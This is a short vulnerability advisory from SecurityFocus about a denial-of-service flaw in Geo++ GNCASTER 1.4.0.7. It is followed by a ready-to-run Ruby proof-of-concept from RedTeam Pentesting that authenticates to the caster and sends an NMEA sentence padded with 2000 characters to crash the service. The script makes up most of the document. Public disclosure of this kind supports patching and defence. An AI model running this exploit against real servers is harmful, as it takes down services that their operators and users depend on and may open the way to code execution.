source: http://www.securityfocus.com/bid/40015/info

Geo++ GNCASTER is prone to a denial-of-service vulnerability.

An attacker with valid login credentials can exploit this issue to cause the application to crash, resulting in a denial-of-service condition. Arbitrary code-execution may also be possible; this has not been confirmed.

Geo++ GNCASTER 1.4.0.7 is vulnerable; other versions may also be affected. 

-------------------------------------------------------------------
#!/usr/bin/env ruby
######################################
#                                    #
#  RedTeam Pentesting GmbH           #
#  kontakt () redteam-pentesting de     #
#  http://www.redteam-pentesting.de  #
#                                    #
######################################

require 'socket'
require 'base64'

if ARGV.length < 3 then
    puts "USAGE: %s host:port user:password stream" % __FILE__
    puts "Example: %s 127.0.0.1:2101 testuser:secret /0001" % __FILE__
    puts
    exit
end

host, port = ARGV[0].split(':')
pw, stream = ARGV[1..2]

begin
    puts "requesting stream %s" % stream.inspect
    sock = TCPSocket.new(host, port.to_i)
    sock.write("GET %s HTTP/1.1\r\n" % stream)
    sock.write("Authorization: Basic %s\r\n" % Base64.encode64(pw).strip)
    sock.write("\r\n")

    response = sock.readline

    puts "server response: %s" % response.inspect

    puts "sending modified nmea data"
    sock.write("$GP" + "A" * 2000 +
        "GGA,134047.00,5005.40000000,N,00839.60000000," +
        "E,1,05,0.19,+00400,M,47.950,M,,*69\r\n")
    puts "done"
end
-------------------------------------------------------------------
